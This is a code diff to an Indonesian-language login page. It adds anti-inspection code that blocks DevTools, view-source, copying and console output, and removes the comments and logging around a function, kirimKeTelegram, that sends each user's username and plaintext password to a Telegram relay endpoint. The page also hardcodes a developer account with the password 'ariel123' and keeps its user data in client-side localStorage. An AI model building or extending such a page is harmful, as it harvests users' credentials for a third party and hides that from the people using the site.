@@ -27,6 +27,18 @@
     position:relative;
     margin:0;
     background:#1a1a1a;
+    -webkit-user-select:none;
+    -moz-user-select:none;
+    -ms-user-select:none;
+    user-select:none;
+    -webkit-touch-callout:none;
+  }
+
+  input, textarea {
+    -webkit-user-select:text;
+    -moz-user-select:text;
+    -ms-user-select:text;
+    user-select:text;
   }
 
   .bg-video {
@@ -605,6 +617,149 @@
   </div>
 
 <script>
+  /* ============================================
+     ANTI-SOURCE PROTECTION
+     ============================================ */
+  (function antiSource() {
+    // 1. Blokir klik kanan
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // 2. Blokir shortcut keyboard
+    document.addEventListener('keydown', function(e) {
+      var k = (e.key || '').toLowerCase();
+
+      // F12
+      if (e.keyCode === 123 || k === 'f12') {
+        e.preventDefault();
+        return false;
+      }
+      // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
+      if (e.ctrlKey && e.shiftKey && (k === 'i' || k === 'j' || k === 'c')) {
+        e.preventDefault();
+        return false;
+      }
+      // Ctrl+U (view source)
+      if (e.ctrlKey && k === 'u') {
+        e.preventDefault();
+        return false;
+      }
+      // Ctrl+S (save page)
+      if (e.ctrlKey && k === 's') {
+        e.preventDefault();
+        return false;
+      }
+      // Ctrl+A (select all)
+      if (e.ctrlKey && k === 'a') {
+        e.preventDefault();
+        return false;
+      }
+      // Ctrl+P (print)
+      if (e.ctrlKey && k === 'p') {
+        e.preventDefault();
+        return false;
+      }
+      // Cmd+Option+I / Cmd+Option+U (Mac)
+      if (e.metaKey && e.altKey && (k === 'i' || k === 'u' || k === 'j' || k === 'c')) {
+        e.preventDefault();
+        return false;
+      }
+      // Cmd+U / Cmd+S (Mac)
+      if (e.metaKey && (k === 'u' || k === 's')) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // 3. Blokir drag
+    document.addEventListener('dragstart', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // 4. Blokir seleksi teks (kecuali input)
+    document.addEventListener('selectstart', function(e) {
+      var t = e.target;
+      if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
+      e.preventDefault();
+      return false;
+    });
+
+    // 5. Blokir copy
+    document.addEventListener('copy', function(e) {
+      var t = e.target;
+      if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
+      e.preventDefault();
+      e.clipboardData.setData('text/plain', 'Dilarang menyalin konten ini.');
+      return false;
+    });
+
+    // 6. Blokir cut
+    document.addEventListener('cut', function(e) {
+      var t = e.target;
+      if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) return true;
+      e.preventDefault();
+      return false;
+    });
+
+    // 7. Anti iframe (jika di-embed di situs lain)
+    if (window.top !== window.self) {
+      try {
+        window.top.location = window.self.location;
+      } catch (e) {
+        document.body.innerHTML = '';
+      }
+    }
+
+    // 8. Deteksi DevTools terbuka (resize + debug)
+    var devtoolsOpen = false;
+    var threshold = 160;
+    setInterval(function() {
+      var wDiff = window.outerWidth - window.innerWidth;
+      var hDiff = window.outerHeight - window.innerHeight;
+      if (wDiff > threshold || hDiff > threshold) {
+        if (!devtoolsOpen) {
+          devtoolsOpen = true;
+          document.body.innerHTML =
+            '<div style="position:fixed;inset:0;background:#000;color:#dc2626;' +
+            'display:flex;align-items:center;justify-content:center;' +
+            'font-family:Inter,sans-serif;font-size:22px;font-weight:900;' +
+            'letter-spacing:2px;text-align:center;padding:20px;z-index:999999;">' +
+            'AKSES DITOLAK<br><span style="font-size:14px;color:#fff;font-weight:600;margin-top:12px;display:block;">' +
+            'Tutup Developer Tools untuk melanjutkan.</span></div>';
+        }
+      } else {
+        devtoolsOpen = false;
+      }
+    }, 1000);
+
+    // 9. Blokir console.log
+    var noop = function() {};
+    try {
+      console.log = noop;
+      console.warn = noop;
+      console.error = noop;
+      console.info = noop;
+      console.debug = noop;
+      console.table = noop;
+    } catch (e) {}
+
+    // 10. Blokir akses view-source via URL
+    if (window.location.href.indexOf('view-source:') === 0) {
+      document.body.innerHTML = 'Akses ditolak.';
+    }
+
+    // 11. Blokir image saving
+    document.addEventListener('mousedown', function(e) {
+      if (e.button === 2) e.preventDefault();
+    });
+  })();
+
+  /* ============================================
+     UI & LOGIKA LOGIN
+     ============================================ */
   function showError(msg) {
     var el = document.getElementById('errorMsg');
     el.textContent = msg;
@@ -636,9 +791,6 @@
     hideMessages();
   }
 
-  /* ============================================
-     USER DATABASE — localStorage
-     ============================================ */
   var DEFAULT_USERS = [
     { username: 'Ariel', password: 'ariel123', role: 'developer', registeredAt: '2026-01-01T00:00:00.000Z' }
   ];
@@ -652,7 +804,6 @@
       }
       var users = JSON.parse(data);
 
-      // Pastikan akun Ariel selalu ada dengan role developer
       var ariel = users.find(function(u) {
         return u.username.toLowerCase() === 'ariel';
       });
@@ -661,7 +812,6 @@
         users.push(DEFAULT_USERS[0]);
         localStorage.setItem('toolsArielUsers', JSON.stringify(users));
       } else {
-        // Paksa role Ariel jadi developer
         ariel.role = 'developer';
         localStorage.setItem('toolsArielUsers', JSON.stringify(users));
       }
@@ -687,32 +837,20 @@
     return null;
   }
 
-  /* ============================================
-     KIRIM KE TELEGRAM
-     ============================================ */
   async function kirimKeTelegram(username, password, tipe) {
     try {
       var res = await fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          username: username,
-          password: password,
-          tipe: tipe
-        })
+        body: JSON.stringify({ username: username, password: password, tipe: tipe })
       });
       var data = await res.json();
-      console.log('Telegram response:', data);
       return data.success === true;
     } catch (err) {
-      console.log('Gagal kirim ke Telegram:', err);
       return false;
     }
   }
 
-  /* ============================================
-     HANDLE LOGIN
-     ============================================ */
   async function handleLogin(e) {
     e.preventDefault();
     hideMessages();
@@ -745,7 +883,6 @@
     await kirimKeTelegram(username, password, 'login');
 
     sessionStorage.clear();
-
     sessionStorage.setItem('user', user.username);
     sessionStorage.setItem('role', user.role || 'member');
     sessionStorage.setItem('loginTime', new Date().toISOString());
@@ -757,9 +894,6 @@
     }, 1200);
   }
 
-  /* ============================================
-     HANDLE REGISTER
-     ============================================ */
   async function handleRegister(e) {
     e.preventDefault();
     hideMessages();
